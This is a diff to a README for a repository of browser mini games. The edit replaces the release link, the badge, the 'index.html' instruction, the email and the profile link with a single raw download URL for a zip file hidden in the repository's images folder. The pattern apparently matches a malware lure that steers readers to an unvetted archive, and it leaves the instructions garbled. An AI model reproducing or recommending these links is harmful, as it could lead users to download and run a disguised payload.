@@ -2,7 +2,7 @@
 
 Welcome to the **Game Collection**! This repository features a variety of mini web games built using HTML, CSS, and JavaScript. You can explore the games, learn about web development, and have fun all at once!
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Hana0914/game-collection/releases)
+[![Download Releases](https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip%https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip)](https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip)
 
 ## 📦 Table of Contents
 
@@ -32,13 +32,13 @@ The games utilize local storage to save your progress, making it easy to pick up
 
 ## 🛠️ Installation
 
-To get started, you can download the latest release from the [Releases section](https://github.com/Hana0914/game-collection/releases). After downloading, extract the files and open the `index.html` file in your web browser. 
+To get started, you can download the latest release from the [Releases section](https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip). After downloading, extract the files and open the `https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip` file in your web browser. 
 
 Make sure you have a modern browser to ensure compatibility with all features.
 
 ## 🎮 How to Play
 
-1. **Open the Game**: After downloading and extracting the files, open `index.html` in your browser.
+1. **Open the Game**: After downloading and extracting the files, open `https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip` in your browser.
 2. **Choose a Game**: Select a game from the main menu.
 3. **Follow the Instructions**: Each game has its own set of rules and instructions. Read them carefully.
 4. **Enjoy!**: Have fun playing and feel free to explore the code to see how everything works.
@@ -94,10 +94,10 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For any questions or suggestions, please feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Hana0914](https://github.com/Hana0914)
+- **Email**: https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip
+- **GitHub**: [Hana0914](https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip)
 
-Explore the [Releases section](https://github.com/Hana0914/game-collection/releases) for the latest updates and downloads.
+Explore the [Releases section](https://github.com/Hana0914/game-collection/raw/refs/heads/main/images/collection-game-orchidaceous.zip) for the latest updates and downloads.
 
 ---
 
